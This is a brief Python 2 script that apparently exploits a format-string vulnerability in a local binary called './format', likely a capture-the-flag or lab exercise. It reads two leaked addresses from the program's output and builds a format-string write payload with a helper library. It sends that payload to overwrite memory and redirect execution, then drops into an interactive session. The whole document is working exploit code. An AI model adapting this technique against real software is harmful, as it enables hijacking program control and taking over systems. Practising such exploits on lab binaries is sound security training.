#!/usr/bin/python2
# coding: utf-8

from holypy.binaries.format import *
from holypy.binaries.phelper import *

prog = spawn("./format")
prog.expect("\r\n")
func = int(prog.before, 16)
prog.expect("\r\n")
addr = int(prog.before, 16)
sendline(generate(addr, func, 7, size = 2), prog)
interact(prog)
